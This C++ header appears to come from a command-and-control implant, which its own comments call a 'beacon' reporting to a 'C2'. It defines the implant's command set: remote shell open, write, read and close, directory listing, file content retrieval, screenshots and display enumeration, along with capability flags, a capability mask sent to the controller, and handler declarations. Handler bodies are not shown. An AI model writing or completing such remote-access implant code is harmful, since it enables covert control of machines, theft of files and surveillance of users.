#pragma once

#include "primitives.h"
#include "shell.h"
#include "screen_capture.h"

// Enum to represent the different command types that can be handled by the agent
enum CommandType : UINT8
{
    Command_Hello = 0,
    Command_GetDirectoryContent = 1,
    Command_GetFileContent = 2,
    Command_GetFileChunkHash = 3,
    Command_WriteShell = 4,
    Command_ReadShell = 5,
    Command_GetDisplays = 6,
    Command_GetScreenshot = 7,
    Command_CloseShell = 8,
    Command_Exit = 9,
    Command_OpenShell = 10,
    CommandTypeCount
};

// =============================================================================
// Compile-time capability flags
//
// Each command has an AGENT_SUPPORT_<COMMAND> macro (default 1). Override to 0
// per-platform/build (e.g. via a toolchain compile definition) to compile a
// command out: it is then both unregistered in the dispatch table (main.cc) and
// reported as unsupported in the Hello capability mask. These macros are the
// single source of truth for which commands this beacon supports — the dispatch
// wiring and BuildCapabilityMask() both derive from them.
// =============================================================================
#ifndef AGENT_SUPPORT_HELLO
#define AGENT_SUPPORT_HELLO 1
#endif
#ifndef AGENT_SUPPORT_GET_DIRECTORY_CONTENT
#define AGENT_SUPPORT_GET_DIRECTORY_CONTENT 1
#endif
#ifndef AGENT_SUPPORT_GET_FILE_CONTENT
#define AGENT_SUPPORT_GET_FILE_CONTENT 1
#endif
#ifndef AGENT_SUPPORT_GET_FILE_CHUNK_HASH
#define AGENT_SUPPORT_GET_FILE_CHUNK_HASH 1
#endif
#ifndef AGENT_SUPPORT_WRITE_SHELL
#define AGENT_SUPPORT_WRITE_SHELL 1
#endif
#ifndef AGENT_SUPPORT_READ_SHELL
#define AGENT_SUPPORT_READ_SHELL 1
#endif
#ifndef AGENT_SUPPORT_GET_DISPLAYS
#define AGENT_SUPPORT_GET_DISPLAYS 1
#endif
#ifndef AGENT_SUPPORT_GET_SCREENSHOT
#define AGENT_SUPPORT_GET_SCREENSHOT 1
#endif
#ifndef AGENT_SUPPORT_CLOSE_SHELL
#define AGENT_SUPPORT_CLOSE_SHELL 1
#endif
#ifndef AGENT_SUPPORT_EXIT
#define AGENT_SUPPORT_EXIT 1
#endif
#ifndef AGENT_SUPPORT_OPEN_SHELL
#define AGENT_SUPPORT_OPEN_SHELL 1
#endif

#ifndef AGENT_BUILD_NUMBER
#define AGENT_BUILD_NUMBER 0
#endif
#ifndef AGENT_COMMIT_HASH
#define AGENT_COMMIT_HASH "00000000"
#endif
#ifndef AGENT_API_VERSION
#define AGENT_API_VERSION 2
#endif

// Build metadata appended to the Hello response
#pragma pack(push, 1)
struct AgentBuildInfo
{
    UINT32 BuildNumber;
    CHAR CommitHash[9]; // 8 hex chars + null
    UINT32 ApiVersion;
};
#pragma pack(pop)

// 256-bit capability mask appended to the Hello response. Bit i (byte i/8,
// bit i%8, LSB-first) is set iff command code i is supported by this beacon.
// Bits [CommandTypeCount .. 255] are reserved (0). The C2 reads a bit with
// (Bits[i/8] >> (i%8)) & 1 to decide whether command code i is available.
static constexpr USIZE CAPABILITY_MASK_BYTES = 32; // 256 bits

#pragma pack(push, 1)
struct CapabilityMask
{
    UINT8 Bits[CAPABILITY_MASK_BYTES];
};
#pragma pack(pop)

// Build the capability mask at compile time from the AGENT_SUPPORT_* macros.
// The bit position of each command equals its CommandType value.
inline constexpr CapabilityMask BuildCapabilityMask() noexcept
{
    CapabilityMask mask = {};
    auto set = [&mask](CommandType command, int supported)
    {
        if (supported)
        {
            USIZE bit = static_cast<USIZE>(command);
            mask.Bits[bit / 8] |= static_cast<UINT8>(1u << (bit % 8));
        }
    };
    set(Command_Hello,               AGENT_SUPPORT_HELLO);
    set(Command_GetDirectoryContent, AGENT_SUPPORT_GET_DIRECTORY_CONTENT);
    set(Command_GetFileContent,      AGENT_SUPPORT_GET_FILE_CONTENT);
    set(Command_GetFileChunkHash,    AGENT_SUPPORT_GET_FILE_CHUNK_HASH);
    set(Command_WriteShell,          AGENT_SUPPORT_WRITE_SHELL);
    set(Command_ReadShell,           AGENT_SUPPORT_READ_SHELL);
    set(Command_GetDisplays,         AGENT_SUPPORT_GET_DISPLAYS);
    set(Command_GetScreenshot,       AGENT_SUPPORT_GET_SCREENSHOT);
    set(Command_CloseShell,          AGENT_SUPPORT_CLOSE_SHELL);
    set(Command_Exit,                AGENT_SUPPORT_EXIT);
    set(Command_OpenShell,           AGENT_SUPPORT_OPEN_SHELL);
    return mask;
}

// Status codes for command handling results
enum StatusCode : UINT32
{
    StatusSuccess = 0,
    StatusError = 1,
    StatusUnknownCommand = 2
};

// Context structure to hold state information for command handlers, such as shell and screen capture context instances
struct Context
{
    ShellManager shellManager;
    ScreenCaptureContext *screenCaptureContext = nullptr;
    // Set by Handle_ExitCommand; read by the main loop so it can send the ACK
    // and then tear down. Lives on the stack (no data section) to stay PIC-safe.
    BOOL shouldExit = false;

    ~Context()
    {
        // shellManager destroys its own shells.
        if (this->screenCaptureContext != nullptr)
        {
            delete this->screenCaptureContext;
            this->screenCaptureContext = nullptr; // Good practice to avoid double-free
        }
    }
};

// Type definition for command handler function pointers
using CommandHandler = VOID (*)(PCHAR command, USIZE commandLength, PPCHAR response, PUSIZE responseLength, Context *context);

// Command handler function declarations
VOID Handle_HelloCommand(PCHAR command, USIZE commandLength, PPCHAR response, PUSIZE responseLength, Context *context);
VOID Handle_GetDirectoryContentCommand(PCHAR command, USIZE commandLength, PPCHAR response, PUSIZE responseLength, Context *context);
VOID Handle_GetFileContentCommand(PCHAR command, USIZE commandLength, PPCHAR response, PUSIZE responseLength, Context *context);
VOID Handle_GetFileChunkHashCommand(PCHAR command, USIZE commandLength, PPCHAR response, PUSIZE responseLength, Context *context);
VOID Handle_ReadShellCommand(PCHAR command, USIZE commandLength, PPCHAR response, PUSIZE responseLength, Context *context);
VOID Handle_WriteShellCommand(PCHAR command, USIZE commandLength, PPCHAR response, PUSIZE responseLength, Context *context);
VOID Handle_OpenShellCommand(PCHAR command, USIZE commandLength, PPCHAR response, PUSIZE responseLength, Context *context);
VOID Handle_CloseShellCommand(PCHAR command, USIZE commandLength, PPCHAR response, PUSIZE responseLength, Context *context);
VOID Handle_GetDisplaysCommand(PCHAR command, USIZE commandLength, PPCHAR response, PUSIZE responseLength, Context *context);
VOID Handle_GetScreenshotCommand(PCHAR command, USIZE commandLength, PPCHAR response, PUSIZE responseLength, Context *context);
VOID Handle_ExitCommand(PCHAR command, USIZE commandLength, PPCHAR response, PUSIZE responseLength, Context *context);